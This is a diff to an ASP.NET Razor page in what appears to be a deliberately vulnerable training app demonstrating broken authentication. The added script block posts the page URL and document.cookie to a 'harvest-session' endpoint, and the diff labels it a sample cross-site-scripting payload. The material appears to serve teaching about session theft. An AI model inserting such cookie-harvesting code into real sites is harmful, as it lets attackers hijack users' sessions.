@@ -1,7 +1,32 @@
-﻿
+﻿@model string
 @{
     ViewData["Title"] = "Authenticated Page";
 }
 
-<h1>You are logged in!</h1>
+<div class="alert alert-danger" role="alert">
+    <h4>Broken Authentication</h4>
+    <ul>
+        <li>
+            There is a session fixation risk!
+        </li>
+        <li>
+            Session data is currently being stolen with a malicious script!
+        </li>
+    </ul>
+</div>
 
+<h1>You are logged in as @Model!</h1>
+
+<a href="/brokenauthbefore/logout">Logout</a>
+
+
+@section Scripts {
+    <script>
+        // sample malicous script, could be on this page from cross site scripting attack!
+        $.post('/api/broken-auth/harvest-session',
+            {
+                Site: window.location.href,
+                Cookies: encodeURIComponent(document.cookie)
+            });
+    </script>
+}
